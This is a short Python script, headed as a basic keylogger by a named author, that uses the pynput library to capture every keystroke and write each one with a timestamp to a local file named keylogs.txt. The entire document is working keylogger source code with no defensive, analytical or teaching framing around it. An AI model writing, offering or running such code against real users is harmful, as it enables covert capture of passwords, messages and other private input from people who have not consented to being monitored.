# Basic Keylogger written by David Gilmore, 2023. Version 1

import pynput.keyboard
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()

